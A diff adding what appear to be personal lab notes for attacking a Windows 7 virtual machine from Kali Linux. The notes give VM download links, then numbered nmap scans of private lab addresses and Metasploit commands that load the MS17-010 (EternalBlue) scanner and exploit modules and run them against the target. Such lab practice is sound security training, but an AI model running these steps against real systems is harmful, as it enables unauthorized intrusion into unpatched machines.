@@ -1,0 +1,89 @@
+24 10 25  attacker kali (tool Metasploit) to target win 7 (hack)
+----------------------------------------------------------------------
+----------------------------------------------------------------------
+----------------------------------------------------------------------
+Establishment Lab ------------
+-----------------------
+Run virtual machines created by VMware Workstation websites - 
+https://www.techspot.com/downloads/downloadnow/1969/?evp=aeae0304eece96beff922bd24ecbb849&file=2171
+----------------
+https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
+--------------------------------------------------------
+VMware Workstation setup download link - 
+https://www.techspot.com/downloads/downloadnowfile/1969/?evp=455ac2f3436ead7bb421a87d4e8952f5&file=2171
+
+
+
+
+------------------------
+Victim/Target Os - windows 7
+https://windows-7-home-premium.en.uptodown.com/windows/download
+----------------------------------
+
+
+
+
+------------------------
+kali website -https://www.kali.org/get-kali/#kali-platforms
+-----------------------------------------------------
+Attacker OS - Kali preinstalled file download link ---
+https://cdimage.kali.org/kali-2024.3/kali-linux-2024.3-vmware-amd64.7z
+----------------------------------------------------
+----------------------------------------------------
+----------------------------------------------------
+-----------------------------------------------------
+=====================================================
+=====================================================
+=====================================================
+Target os--
+
+Window - 7 command line - cmd- 
+1.
+ipconfig
+=-===================================================
+-----------------------------------------------------
+=====================================================
+Attacker Os--
+kali terminal cmd................
+1  
+ip a    
+2  
+msfconsole
+
+----------------------------------------------------
+----------------------------------------------------
+Metasploit cmd..
+
+1
+nmap -Pn -v 192.168.176.159
+2
+nmap -Pn  192.168.176.159
+3
+nmap -T  192.168.176.159
+4
+nmap   192.168.176.159
+5
+nmap  -Pn -v  192.168.176.151
+6 
+search auxiliary smb 10
+7
+use auxiliary/scanner/smb/smb_ms17_010
+8
+set RHOSTS 192.168.176.151
+9
+exploit
+10
+back
+11
+search exploit smb eternalblue
+12
+use exploit/windows/smb/ms17_010_eternalblue
+13
+set RHOSTS 192.168.176.151
+14
+exploit
+15
+back
+16
+history
+-------------
